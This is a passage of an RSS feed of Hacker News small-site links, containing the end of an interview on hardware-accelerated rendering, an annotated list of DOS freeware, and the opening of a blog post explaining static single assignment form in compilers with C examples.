<p>For example, our tests in image processing show that this approach often beats hand-optimized code because that code is very tedious and difficult to write such that not all promising optimization options are actually explored. Since simply use the generic code plus some rather simple mapping code for each specific HW, exploring the space of possible optimizations is much larger.</p>



<p>By now, we have already written a full ray tracer in AnyDSL that compiles and runs efficiently both on various different GPUs and CPUs. However, not all optimizations have been applied yet, so that we cannot really compare its performance yet. This will happen in the next few months but the partial results we have so far are already very promising.</p>



<p><strong>– Corona Render </strong><a href="http://home.seekscale.com/blog/corona-render-1.0-a-peek-into-interactive-rendering"><strong>uses</strong></a><strong> for example Intel Embree ray tracing library, for the CPU. What do you think of this solution?</strong></p>



<p>As I argue above, these tools are very useful. They provide hand-optimized kernels that solve some of the core problems, particular the inner loops and can thus be used as the basis for the higher layers, just as Corona did. However, they are essentially black boxes which makes it harder to adapt them to different purposes.</p>



<p>I believe that we need to go beyond these individual optimized kernels and create generic, adaptable, and reusable building blocks for rendering. That can be combined in flexible ways to create optimized renderers for many configurations and HW platforms. So far, we have been missing the right tools to even think how this could be done.</p>



<p>With AnyDSL we now have a tool that for the first time allows us to address this challenge. Now we are investigating how the to design such a flexible rendering framework: What are the right abstractions to be used at the different levels? How do we best map them to HW platforms? Which algorithms work best in what context and how do we need to formulate them, so they can easily be combined? How do we determine the data layout to optimize for different algorithms using it? And so on.</p>



<p>Essentially, AnyDSL allows us to rethink the design of renderers in a fundamentally new way.</p>



<p><strong>– In a </strong><a href="http://www.scarydevil.com/~peter/io/raytracing-vs-rasterization.html"><strong>GameStar interview</strong></a><strong> you mentioned you were working on FPGAs. FPGAs are a quickly growing field for those who need to optimize hardware for specific use cases. GPU is by definition hardware optimized for CG, yet you …</strong></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fruty.io/2015/01/15/cpu-vs-gpu-a-discussion-about-hardware-acceleration-and-rendering/">https://fruty.io/2015/01/15/cpu-vs-gpu-a-discussion-about-hardware-acceleration-and-rendering/</a></em></p>]]>
            </description>
            <link>https://fruty.io/2015/01/15/cpu-vs-gpu-a-discussion-about-hardware-acceleration-and-rendering/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869443</guid>
            <pubDate>Fri, 23 Oct 2020 13:49:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interesting DOS Programs]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24869299">thread link</a>) | @elvis70
<br/>
October 23, 2020 | https://dosprograms.info.tt/indexall.htm | <a href="https://web.archive.org/web/*/https://dosprograms.info.tt/indexall.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="intro">
<p>Here are several links to various DOS software and other DOS related websites. Most are freeware but a few are shareware and commercial programs. I welcome any comments and/or suggestions you may have about this webpage or other DOS programs for me to know about. Also, do email a thank you to the authors of any of the programs you use.</p>
<p>If you like to see Interesting Windows and Mac programs similiar to this page, visit my computer user group, the <a href="http://www.cs.tt/links">Trinidad&nbsp;and&nbsp;Tobago&nbsp;Computer&nbsp;Society</a></p>
<p><b>Browse the Interesting DOS programs site with each DOS program category having its own page : <a href="https://dosprograms.info.tt/index.htm">Interesting DOS programs</a></b>
</p><p>After nearly 20 years, Interesting DOS programs is moving from <i>http://www.opus.co.tt/dave/</i> to <b><a href="https://dosprograms.info.tt/">http://dosprograms.info.tt</a></b>! <b>Please update your bookmarks!</b></p>
<p>Comments? My E-mail address: Dev Anand Teelucksingh, devtee at gmail.com</p>
</div><div>
<h3><a name="new">New/Updated Links</a> (updated June 27 2020)</h3>
<ul>
<li><a href="http://ladsoft.tripod.com/orange_c_compiler.html">Orange C/C++ Compiler 6.0.43.1</a> C/C++ compiler with IDE, debugger. Released under GPL v3 and last updated May 2020</li>
<li><a href="http://www.sysinfolab.com/index.htm">Astra 6.70</a> Advanced Sysinfo Tool and Reporting Assistant - system information tool updated Nov 2019. Demo available</li>
</ul>
<ul>
<li><a href="https://www.hwinfo.com/">HWiNFO&nbsp;v6.11</a> system information utility designed for detection of hardware. Last updated May 2020!</li>
<li><a href="http://mpxplay.sourceforge.net/">Mpxplay v1.64</a> MP3,OGG,WAV,AAC,FLAC, WMA, MPC,AC3 player with integrated file browser, spectrum analyser and other features.</li>
<li><a href="http://www.uwe-sieber.de/english.html">UMBPCI&nbsp;V3.89</a> Free hardware UMB driver (only 240 bytes) for DOS/Win9x - replaces EMM386.EXE</li>
<li><a href="https://www.cgsecurity.org/wiki/TestDisk">TestDisk&nbsp;v7.2 WIP</a> Tool to check and undelete hard disk partitions. Supports FAT16/FAT32, ext2FS, NTFS and more</li>
<li><a href="https://www.cgsecurity.org/wiki/PhotoRec">PhotoRec v7.2 WIP</a> file data recovery software designed to recover lost files from Hard Disks and CDRom</li>
<li><a href="https://www.terabyteunlimited.com/image-for-dos.htm">Image v3.40</a> Disk image backup and restore program. Supports FAT, FAT32, NTFS partitions and most writable USB, IEE1394 drives, ATAPI CD/DVD drives without special drivers. Shareware</li>
<li><a href="http://waterlan.home.xs4all.nl/">WCD 6.0.3</a> Wherever Change Directory allows you to change to any directory by typing part of a directory name</li>
<li><a href="http://www.brutman.com/mTCP/">mTCP 2020-03-07</a> a TCP/IP stack with several applications (DHCP client, FTP client, ping, HTGet, FTP Server, HTTP server, Telnet and more)</li>
<li><a href="https://www.freepascal.org/">Free&nbsp;Pascal&nbsp;v3.2.0</a> 32 bit compiler for DOS, Linux, Win32 and other platforms. Semantically equivalent to TP 7.0</li>
</ul>
<h3>New/Updated Links (updated October 7 2019)</h3>
<ul>
<li><a href="http://links.twibright.com/">Links Web Browser 2.20</a> Open Source text web browser</li>
<li><a href="https://www.terabyteunlimited.com/image-for-dos.htm">Image v3.32</a> Disk image backup and restore program. Supports FAT, FAT32, NTFS partitions and most writable USB, IEE1394 drives, ATAPI CD/DVD drives without special drivers. Shareware</li>
<li><a href="https://www.cgsecurity.org/wiki/TestDisk">TestDisk&nbsp;v7.1</a> Tool to check and undelete hard disk partitions. Supports FAT16/FAT32, ext2FS, NTFS and more</li>
<li><a href="https://www.cgsecurity.org/wiki/PhotoRec">PhotoRec v7.1</a> file data recovery software designed to recover lost files from Hard Disks and CDRom</li>
<li><a href="http://www.uwe-sieber.de/english.html">UMBPCI&nbsp;V3.89</a> Free hardware UMB driver (only 240 bytes) for DOS/Win9x - replaces EMM386.EXE</li>
<li><a href="http://waterlan.home.xs4all.nl/">WCD 6.0.3</a> Wherever Change Directory allows you to change to any directory by typing part of a directory name</li>
</ul>
<h3>New/Updated Links (updated April 26 2019)</h3>
<ul>
<li><a href="http://www.ibiblio.org/pub/micro/pc-stuff/freedos/files/distributions/1.3/previews/1.3-rc1/">FreeDOS v1.3 RC1</a> (released Feb 2019) - test out the new version of FreeDOS</li>
<li><a href="http://links.twibright.com/">Links Web Browser 2.19</a> Open Source text web browser</li>
</ul>
<ul>
<li><a href="http://mpxplay.sourceforge.net/">Mpxplay v1.63</a> MP3,OGG,WAV,AAC,FLAC, WMA, MPC,AC3 player with integrated file browser, spectrum analyser and other features.</li>
<li><a href="http://dosmid.sourceforge.net/">DOSMid 0.9.5</a> DOSMid is a text mode MIDI and MUS player for DOS that can run on a 8086 CPU</li>
<li><a href="http://www.uwe-sieber.de/english.html">UMBPCI&nbsp;V3.88</a> Free hardware UMB driver (only 240 bytes) for DOS/Win9x - replaces EMM386.EXE</li>
<li><a href="http://www.partition-saving.com/">Savepart&nbsp;v4.60</a> save entire or occupied portion of a hard drive partition (FAT16/32,ext2,ext3,NTFS) into a file for easy backup and restoration</li>
<li><a href="https://www.terabyteunlimited.com/image-for-dos.htm">Image v3.29</a> Disk image backup and restore program. Supports FAT, FAT32, NTFS partitions and most writable USB, IEE1394 drives, ATAPI CD/DVD drives without special drivers. Shareware</li>
<li><a href="http://upx.sourceforge.net/">UPX&nbsp;v3.95</a> powerful GPL'ed executable packer (meaning the compressed executable files can still be run directly)</li>
</ul>
<ul>
<li><a href="#top">Back to Top of Page</a></li>
</ul>
</div><div>
<h3><a name="sound">Sound Programs</a> (includes audio CD players)</h3>
<ul>
<li><a href="http://mpxplay.sourceforge.net/">Mpxplay v1.64</a> MP3,OGG,WAV,AAC,FLAC, WMA, MPC,AC3 player with integrated file browser, spectrum analyser and other features.</li>
<li><a href="http://www.multimediaware.com/qv/index.html">QuickView&nbsp;Pro v2.61</a> Plays MP3,WAV,OGG and view other graphic and video formats.</li>
<li><a href="http://www.cubic.org/player/index.html">OpenCP v2.60pre6</a> DOS music player (MP3, MIDI, MOD, WAV, CD-audio) with spectrum analyser and other features. GPL</li>
<li><a href="http://www.damp-mp3.co.uk/">DAMP&nbsp;v0.97&nbsp;WIP&nbsp;8</a> Free MP3 Player. Displays synchronised graphics when playing MP3 files. Source code available</li>
<li><a href="https://www.scene.org/dir.php?dir=%2Fdemos%2Fgroups%2Fsanction/">XTCPlay&nbsp;v0.97c</a> Graphical audio player of MP3, WAV, S3M, MOD and more from the demo group Sanction.</li>
<li><a href="https://dosprograms.info.tt/download/dosamp08.zip">DOSAMP&nbsp;v0.8</a> DOSAMP is a freeware command-line MP3 player.</li>
</ul><ul>
<li><a href="http://www.micosyen.com/">MPR 10/04/10</a> Small, minimalist DOS MP3 player (33K exe)</li>
<li><a href="ftp://ftp.sac.sk/pub/sac/sound/jukemp3.zip">JukeMp3&nbsp;beta</a> Mp3/Mp2/Xm/Mod/S3m/CD-DA DOS player that tries to emulate a turntable.</li>
<li><a href="https://dosprograms.info.tt/download/dss.zip">DSS&nbsp;v3.-1</a> MP3/WAV player/recorder with several display modes during playback. Also supports PC speaker!</li>
</ul><ul>
<li><a href="http://www2.arnes.si/~mmilut/BladeEnc.html">BladeEnc&nbsp;v0.941</a> DOS port of BladeEnc command line MP3 encoder; create MP3 files from WAV files.</li>
<li><a href="https://dosprograms.info.tt/download/lame392.zip">LAME&nbsp;v3.92</a> DOS port of <a href="http://lame.sourceforge.net/index.php">LAME</a>, a GPL'd WAV to MP3 encoder. Encodes faster than real time on a PII 266.</li>
<li><a href="https://dosprograms.info.tt/download/Audiocvd.zip">AudioCVD&nbsp;v1.20</a> WAV to OGG (open-source replacement for MP3) converter</li>
<li><a href="https://dosprograms.info.tt/download/cd2wav.zip">CD2WAV&nbsp;v1.0i</a> Read audio CD tracks directly to WAV files</li>
<li><a href="http://www.damp-mp3.co.uk/">ID3TOOLS</a> edit ID Tags of MP3s and list files with ID Tag info. Source code available.</li>
</ul><ul>
<li><a href="http://dosmid.sourceforge.net/">DOSMid 0.9.5</a> DOSMid is a text mode MIDI and MUS player for DOS that can run on a 8086 CPU</li>
<li><a href="https://web.archive.org/web/20190118024711/http://www.pldos.pl/windos/midier.htm">MIDIer 2.50</a> DOS based MIDI and RMI player that works with all versions of the Sound Blaster card. Source code available</li>
<li><a href="https://dosprograms.info.tt/download/megam166.zip">Megamid&nbsp;v1.66</a> Graphical MIDI Player for DOS. Also supports playing of Karaoke MIDI files</li>
<li><a href="https://dosprograms.info.tt/download/gsplay1.zip">GSPLAY&nbsp;v1.1</a> A freeware MIDI player. Can also play Karaoke MIDI files.</li>
<li><a href="https://dosprograms.info.tt/download/midget20.zip">Midget&nbsp;v2.03</a> DOS-based MIDI composer ; works with wavetable sound cards or internal speaker.</li>
</ul><ul>
<li><a href="http://www.fysnet.net/cdp.htm">CDPlayer&nbsp;v2.25e</a> Audio CD player which looks like the Win95 CD Player. Source code included.</li>
<li><a href="http://www.6502.org/users/sjgray/software/sjgplay/sjgplay_dos.html">SJGPlay&nbsp;v1.29</a> Easy to use freeware Audio CD Player with Lyrics and playlist for each CD.</li>
<li><a href="https://dosprograms.info.tt/download/cdptsr12.zip">CDPTSR&nbsp;v0.12</a> CDPTSR is a memory resident CD Player; uses only 3.5K resident</li>
</ul>
<ul>
<li><a href="#top">Back to Top of Page</a></li>
</ul>
</div><div>
<h3><a name="graphics">Graphics_Programs/Screensavers</a></h3>
<ul>
<li><a href="http://www.multimediaware.com/qv/index.html">QuickView&nbsp;Pro v2.61</a> Plays MP4(!), AVI (incl DivX), MPG, MOV (Quicktime), MP3, WAV, OGG and view other graphic formats.</li>
<li><a href="http://www.xnview.com/en/nconvert/">NConvert v6.88</a> command line batch image processor with more than 80 commands and compatible with 500 image formats.</li>
<li><a href="http://www.pictview.com/">PictureViewer&nbsp;1.94</a> PictureViewer can view and convert many graphic formats. Freeware</li>
<li><a href="https://dosprograms.info.tt/download/Sea3.ZIP">SEA&nbsp;v1.3</a> This shareware viewer/converter/image manipulator has an easy to use GUI</li>
<li><a href="http://hplx.pgdn.de/">LXPIC&nbsp;v7.3</a> Small (size of exe :20K!) yet powerful viewer of JPG, GIF, PCX, CAM and others</li>
<li><a href="http://multimediaware.com/mpeg/">MPEGone&nbsp;v1.10</a> DOS MPEG and VideoCD player</li>
<li><a href="ftp://ftp.elf.stuba.sk/pub/pc/graph/dvd4dos1.zip">DVD4DOS Beta 1</a> non-realtime playback of DVD movies</li>
</ul><ul>
<li><a href="http://ge.tt/1JsVbAA2/v/0">Pixel 1.0 Beta 5 build 481</a> Impressive shareware Photoshop-style graphics editor (supports layers, channels, Truetype fonts, etc).</li>
<li><a href="http://animatorpro.org/">Animator Pro</a> a.k.a Autodesk Animator is a 256 colour paint and animation program. Opensource</li>
<li><a href="https://web.archive.org/web/20170810221043/http://www.neosoftware.com/order-legacy.html">Neopaint&nbsp;v3.2d</a> a shareware image editing and painting program.</li>
<li><a href="http://www.bttr-software.de/products/vp386/">VGA Paint 386</a> opensource painting program</li>
</ul><ul>
<li><a href="http://www.noah.org/acidwarp/">Acidwarp</a> Fractal generator which can be used as a screensaver.</li>
<li><a href="https://oitofelix.github.io/decimatrix-8086/">DeciMatrix</a> Matrix like screensaver</li>
<li><a href="https://www.scene.org/dir.php?dir=%2Fdemos%2Fgroups%2Fsanction/">Sanction&nbsp;4K&nbsp;demos</a> Several impressive 4K demos (one is a Descent type engine) by the demo group Sanction</li>
<li><a href="https://dosprograms.info.tt/download/ccard98.zip">Christmas&nbsp;Card&nbsp;1998</a> Very good multimedia xmas card. Add your text and send it to friends.</li>
</ul>
<ul>
<li><a href="#top">Back to Top of Page</a></li>
</ul>
</div><div>
<h3><a name="internet">Internet</a></h3>
<ul>
<li><a href="http://www.glennmcc.org/">Arachne v1.97 GPL</a> updated GPL version of Arachne, a graphical DOS Internet suite (web browser, FTP, Email).</li>
<li><a href="http://links.twibright.com/">Links Web Browser 2.20</a> Open Source text web browser</li>
<li><a href="http://home.arachne.cz/">Arachne&nbsp;v1.70&nbsp;Release&nbsp;3</a> The final offical release of the graphical DOS Internet suite (web browser, FTP, Email) out there. Now has preliminary CSS support.</li>
<li><a href="https://code.google.com/p/nanox-microwindows-nxlib-fltk-for-dos/">Dillo for DOS v3.0.2b</a> port of <a href="http://www.dillo.org/">Dillo</a> multi-platform web browser</li>
<li><a href="http://www.rahul.net/dkaufman/index.html">Lynx&nbsp;2.8.5rel.1</a> DOS port of the text based Linux browser. Can access secure (https) websites</li>
<li><a href="http://macall.net/">DOSLynx v0.43b</a> another port of text based Lynx browser</li>
<li><a href="http://www.nettamer.net/">Net-tamer&nbsp;v1.13 beta</a> text based internet suite (browser,email,FTP,Usenet). Speech friendly for talking programs</li>
</ul><ul>
<li><a href="http://rubbermallet.org/">CHASE 1.0</a> DOS-based POP3/SMTP e-mail client</li>
<li><a href="http://josh.com/JOSHFTP/">JOSHFTP</a> DOS-based FTP client</li>
<li><a href="http://picosntp.sourceforge.net/">picoSNTP 0.91</a>: an SNTP (Simple Network Time Protocol) client for DOS to synchronize the computer clock with NTP servers</li>
<li><a href="http://www.rubbermallet.org/">leetIRC v1.1</a> DOS Internet Relay Chat (IRC) client with support for mIRC colour and bold codes, DCC file transfer support and more</li>
<li><a href="http://www.rowan.sensation.net.au/">Toffee&nbsp;IRC&nbsp;client&nbsp;v1.0</a> DOS IRC client ; works with any packet driver</li>
<li><a href="http://www.rubbermallet.org/">RockIRCd v1.0 testing</a> Internet Relay Chat (IRC) server for DOS</li>
<li><a href="http://www.brutman.com/mTCP/">mTCP 2015-07-05</a> a TCP/IP stack with several applications (DHCP client, FTP client, ping, HTGet, FTP Server, HTTP server, Telnet and more)</li>
</ul><ul>
<li><a href="http://picotcp4dos.sourceforge.net/">picoTCP</a> picoTCP is an open source IPv4/IPv6 TCP/IP stack ported to DOS by <a href="http://mateusz.viste.fr/">Mateusz Viste</a></li>
<li><a href="http://ladsoft.tripod.com/index.html">LSppp&nbsp;V1.0</a> Excellent small PPP packet driver (28K resident!) for DOS. Has built-in dialer. Released under GPL.</li>
<li><a href="https://web.archive.org/web/20140702140916/http://hanewin.net/old-e.htm">PEPA&nbsp;v1.9</a> Packet Driver for PPP access over ADSL.</li>
<li><a href="http://wizard.ae.krakow.pl/%7ejb/comring/">Comring&nbsp;v1.20</a> Packet driver for serial ports; can be used to connect multiple computers via serial cable</li>
</ul><ul>
<li><a href="https://web.archive.org/web/20090201064500/http://www.dossolutions.pwp.blueyonder.co.uk/eznos.htm">EZ-NOS 2</a> a http web server with Server Side Includes support, secure FTP Server with md5 authenication, DNS server and a TCP/IP access filter (firewall) and more!</li>
<li><a href="http://rubbermallet.org/">WebServ 0.9beta</a> DOS based HTTP server in QuickBasic</li>
<li><a href="http://www.georgpotthast.de/sioux/">Sioux</a> DOS web server with DYNDNS client</li>
<li><a href="http://www.rowan.sensation.net.au/">Jaffa&nbsp;WWW&nbsp;server&nbsp;for&nbsp;DOS</a> Tested on a 80286, supports CGI-BIN utilities external to the server</li>
<li><a href="http://josh.com/tiny/index.htm">Tiny</a> TINY is a set of programs that lets you control a DOS computer from any Java-capable machine over a TCP/IP connection.</li>
<li><a href="http://users.ohiohills.com/fmacall/jsarich/index.htm">Internet&nbsp;Extender&nbsp;v1.0b</a> (Mirror Link is from <a href="http://users.ohiohills.com/fmacall/">Fred's DOS Internet Software page</a>) Freeware DOS Gateway router which allows networked computers to access the Internet (via a modem or network card)</li>
</ul><ul>
<li><a href="http://www.caddit.net/engineering/programming/">Mutt 1.5.5</a> text-based e-mail client with modified patches for NNTP, POP and SMTP ('builtin' sendmail) and calls to external apps (i.e. 'print', 'pipe message' and 'pipe attachment')</li>
<li><a href="https://code.google.com/p/nanox-microwindows-nxlib-fltk-for-dos/">FLMail 0.91</a> Graphical email client. Supports OpenSSL.</li>
<li><a href="http://www.rahul.net/dkaufman/index.html">Wget&nbsp;1.8.2</a> Download files and entire sites for offline browsing using HTTP or FTP; can RESUME ABORTED downloads!</li>
<li><a href="http://sshdos.sourceforge.net/">SSHDOS&nbsp;v0.95</a> opensource SSH (Secure Shell) DOS client for secure telnet connections.</li>
</ul><ul>
<li><a href="http://www.theabsolute.net/sware/index.html#viewhtml">ViewHTML&nbsp;v2.5</a> Freeware text based offline HTML viewer/browser.</li>
<li><a href="https://web.archive.org/web/20070723110021/http://home.mnet-online.de/horst.muc/int/gpage19.zip">GPAGE&nbsp;v1.9</a> Uses a text file to generate a local page of links</li>
<li><a href="https://web.archive.org/web/20090724202836/http://ca.geocities.com/nickbeee/tidy386">Tidy386</a> HTML validator and can also clean up your HTML</li>
<li><a href="http://www.cine.net/~cberry/orbinfo.html">Orb&nbsp;v2.0</a> HTML preprocessor designed to simplify creation and maintenance of web pages</li>
<li><a href="http://dennisbareis.com/ppwizard.htm">PPWIZARD&nbsp;17.308</a> Free, multi-platform HTML Preprocessor. …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dosprograms.info.tt/indexall.htm">https://dosprograms.info.tt/indexall.htm</a></em></p>]]>
            </description>
            <link>https://dosprograms.info.tt/indexall.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869299</guid>
            <pubDate>Fri, 23 Oct 2020 13:36:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding static single assignment forms]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24869227">thread link</a>) | @woodruffw
<br/>
October 23, 2020 | https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms | <a href="https://web.archive.org/web/*/https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<h2><em>Programming, philosophy, pedaling.</em></h2>

<ul>
    <li><a href="https://blog.yossarian.net/">Home</a></li>
    <li><a href="https://blog.yossarian.net/tags">Tags</a></li>
    <li><a href="https://blog.yossarian.net/favorites">Favorites</a></li>
    <li><a href="https://blog.yossarian.net/archive">Archive</a></li>
    
      <li><a href="https://yossarian.net/">Main Site</a></li>
    
</ul>

<hr>



<h2>
  <em>Oct 23, 2020</em>
</h2>

  <p>Tags:
  
    
    <a href="https://blog.yossarian.net/tags#llvm">llvm</a>,
    
  
    
    <a href="https://blog.yossarian.net/tags#programming">programming</a>
    
  
  </p>


<p><em>With thanks to <a href="https://twitter.com/inventednight/">Niki Carroll</a>, winny, and kurufu for their
invaluable proofreading and advice.</em></p>

<h2 id="preword">Preword</h2>

<p>By <a href="https://twitter.com/8x5clPW2/status/1311316978703970307">popular demand</a>, I’m doing another
LLVM post. This time, it’s <strong>single static assignment</strong> (or SSA) form, a common feature
in the intermediate representations of optimizing compilers.</p>

<p>Like <a href="https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example">the last one</a>, SSA is a
topic in compiler and IR design that I <em>mostly</em> understand but could benefit from some self-guided
education on. So here we are.</p>

<h2 id="how-to-represent-a-program">How to represent a program</h2>

<p>At the highest level, a compiler’s job is singular: to turn some source language <em>input</em>
into some machine language <em>output</em>. Internally, this breaks down into a sequence of clearly
delineated<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> tasks:</p>

<ol>
  <li><strong>Lexing</strong> the source into a sequence of tokens</li>
  <li><strong>Parsing</strong> the token stream into an <strong>abstract syntax tree</strong>, or AST<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
  <li><strong>Validating</strong> the AST (e.g., ensuring that all uses of identifiers are consistent with the
source language’s scoping and definition rules)<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
  <li><strong>Translating</strong> the AST into machine code, with all of its complexities (instruction selection,
register allocation, frame generation, &amp;c)</li>
</ol>

<p>In a <strong>single-pass</strong> compiler, (4) is monolithic: machine code is generated as the compiler walks
the AST, with no revisiting of previously generated code. This is extremely fast (in terms of
compiler performance) in exchange for some a few significant limitations:</p>

<ul>
  <li>
    <p>Optimization potential: because machine code is generated in a single pass, it can’t be revisited
for optimizations. Single-pass compilers tend to generate extremely slow and <em>conservative</em>
machine code.</p>

    <p>By way of example: the
  <a href="https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf">System V ABI</a>
  (used by Linux and macOS) defines
  <a href="https://en.wikipedia.org/wiki/Red_zone_(computing)">a special 128-byte region</a> beyond the
  current stack pointer (<code>%rsp</code>) that can be used by leaf functions whose stack frames fit within
  it. This, in turn, saves a few stack management instructions in the function prologue and
  epilogue.</p>

    <p>A single-pass compiler will struggle to take advantage of this ABI-supplied
  optimization: it needs to emit a stack slot for each automatic variable as they’re visited,
  and cannot revisit its function prologue for erasure if all variables fit within the red zone.</p>
  </li>
  <li>
    <p>Language limitations: single-pass compilers struggle with common language design decisions, like
allowing use of identifiers before their declaration or definition. For example, the following
is valid C++:</p>

    <div><div><pre><code>  <span>class</span> <span>Rect</span> <span>{</span>
  <span>public:</span>
    <span>int</span> <span>area</span><span>()</span> <span>{</span> <span>return</span> <span>width</span><span>()</span> <span>*</span> <span>height</span><span>();</span> <span>}</span>
    <span>int</span> <span>width</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
    <span>int</span> <span>height</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
  <span>};</span>
</code></pre></div>    </div>

    <p>C and C++ <em>generally</em> require pre-declaration and/or definition for identifiers, but
  member function bodies may reference the entire class scope. This will frustrate a
  single-pass compiler, which expects <code>Rect::width</code> and <code>Rect::height</code> to already exist
  in some symbol lookup table for call generation.</p>
  </li>
</ul>

<p>Consequently, (virtually) all modern compilers are <strong>multi-pass</strong>.</p>

<p><img src="https://blog.yossarian.net/assets/multipass.jpg" alt="Pictured: Leeloo Dallas from The Fifth Element holding up her multi-pass.">
<em>“multi-pass” — Leeloo Dallas</em></p>

<p>Multi-pass compilers break the <em>translation</em> phase down even more:</p>

<ol>
  <li>The AST is lowered into an <strong>intermediate representation</strong>, or IR</li>
  <li>Analyses (or passes) are performed on the IR, refining it according to some optimization
profile (code size, performance, &amp;c)</li>
  <li>The IR is either translated to machine code <em>or</em> lowered to <em>another</em> IR, for further target
specialization or optimization<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
</ol>

<p>So, we want an IR that’s easy to <em>correctly</em> transform and that’s amenable to optimization. Let’s
talk about why IRs that have the <strong>static single assignment</strong> property fill that niche.</p>

<h2 id="ssa-form">SSA form</h2>

<p>At its core, the SSA form of any program source program introduces only one new constraint:
all variables are assigned (i.e., stored to) <strong>exactly once</strong>.</p>

<p>By way of example: the following (not actually very helpful) function is <strong>not</strong> in a valid SSA form
with respect to the <code>flags</code> variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags</span> <span>|=</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Why? Because <code>flags</code> is stored to twice: once for initialization, and (potentially) again inside
the conditional body.</p>

<p>As programmers, we could rewrite <code>helpful_open</code> to only ever store once to each automatic variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>But this is clumsy and repetitive: we essentially need to duplicate every chain of uses that
follow any variable that is stored to more than once. That’s not great for readability,
maintainability, or code size.</p>

<p>So, we do what we always do: make the compiler do the hard work for us. Fortunately there exists
a transformation from every valid program into an equivalent SSA form, conditioned on two simple
rules.</p>

<blockquote>
  <p>Rule #1: Whenever we see a store to an already-stored variable, we replace it with a brand
new “version” of that variable.</p>
</blockquote>

<p>Using rule #1 and the example above, we can rewrite <code>flags</code> using <code>_N</code> suffixes to indicate versions:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>// Declared up here to avoid dealing with C scopes.</span>
  <span>int</span> <span>flags_1</span><span>;</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_1</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>But wait a second: we’ve made a mistake!</p>

<ul>
  <li><code>open(..., flags_1, ...)</code> is incorrect: it unconditionally assigns <code>O_CREAT</code>, which wasn’t in the
original function semantics.</li>
  <li><code>open(..., flags_0, ...)</code> is <strong>also</strong> incorrect: it <em>never</em> assigns <code>O_CREAT</code>, and thus
is wrong for the same reason.</li>
</ul>

<p>So, what do we do? We use rule 2!</p>

<blockquote>
  <p>Rule #2: Whenever we need to <em>choose</em> a variable based on control flow, we use the Phi function
(φ) to introduce a <strong>new</strong> variable based on our choice.</p>
</blockquote>

<p>Using our example once more:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
    <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

    <span>// Declared up here to avoid dealing with C scopes.</span>
    <span>int</span> <span>flags_1</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
      <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>}</span>

    <span>int</span> <span>flags_2</span> <span>=</span> <span>φ</span><span>(</span><span>flags_0</span><span>,</span> <span>flags_1</span><span>);</span>

